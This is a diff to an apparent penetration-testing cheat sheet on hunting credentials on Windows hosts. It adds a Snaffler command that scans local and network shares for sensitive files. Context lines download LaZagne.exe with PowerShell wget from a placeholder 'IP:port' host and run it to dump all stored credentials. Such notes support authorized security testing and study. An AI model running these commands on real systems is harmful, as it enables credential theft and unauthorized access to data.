@@ -215,7 +215,12 @@ PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
 PS> .\LaZagne.exe all
 ```
 
-You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small>.
+You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small> to find juicy files on your host and every available share on the network.
+
+```ps
+PS> Snaffler.exe -s -d domain -o snaffler.log -v data
+<#press enter multiples times if stdout stuck#>
+```
 
 You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.1k ⭐, 2018 🪦)</small>.
 
